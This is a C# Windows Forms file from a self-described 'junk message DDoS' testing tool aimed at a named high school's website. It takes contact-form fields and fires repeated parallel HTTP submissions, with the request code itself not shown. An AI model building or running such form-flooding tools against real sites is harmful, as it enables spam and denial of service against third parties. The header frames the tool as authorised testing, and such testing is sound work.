/*
     Junk message DDoS bug testing tool for Shenzhen High School of Science

     By Jackson Ming Hu in RMIT University, Melbourne, Australia
     December 20, 2015   huming2207@gmail.com

     Warning: This tool is written for IT Management Department in SHSS only.
              I will obviously NOT publish its binary files and/or source code, 
              until they fix their bugs.
  
*/

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Web;


namespace ddTester
{
    public partial class mainForm : Form
    {
        public mainForm()
        {
            InitializeComponent();
            // Disable Thread-safe detection. It's okay for a testing tool, 
            // although it may causes troubles. Don't be so serious. We'll be fine then. :)
            Control.CheckForIllegalCrossThreadCalls = false; 
        }

        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Int32.TryParse(threadTextbox.Text, out Controller.ctrlVar.thread);
            Int32.TryParse(runCrTextbox.Text, out Controller.ctrlVar.runTimes);
            Controller.ctrlVar.name = HttpUtility.UrlEncode(nameTextbox.Text);
            Controller.ctrlVar.phone = HttpUtility.UrlEncode(phoneTextbox.Text);
            Controller.ctrlVar.email = HttpUtility.UrlEncode(emailTextbox.Text);
            Controller.ctrlVar.title = HttpUtility.UrlEncode(titleTextbox.Text);
            Controller.ctrlVar.comment = HttpUtility.UrlEncode(commentTextbox.Text);
            MessageBox.Show("Now running \r\n Do not press this button again.");

            RunParallel(Controller.ctrlVar.thread, Controller.ctrlVar.runTimes);
            Controller.ReleaseMemory(false);



        }

        private void mainForm_Load(object sender, EventArgs e)
        {

        }




        public void RunParallel(int thread, int runTimes)
        {
           
            Parallel.For(0, runTimes, new ParallelOptions { MaxDegreeOfParallelism = thread }, index =>
            {
                Controller.SendHTTP();
                Controller.ReleaseMemory(true);

            });
            MessageBox.Show("Done, now may still running, please use Fiddler to monitor it.");
            startButton.Enabled = true;
        }


    }
}
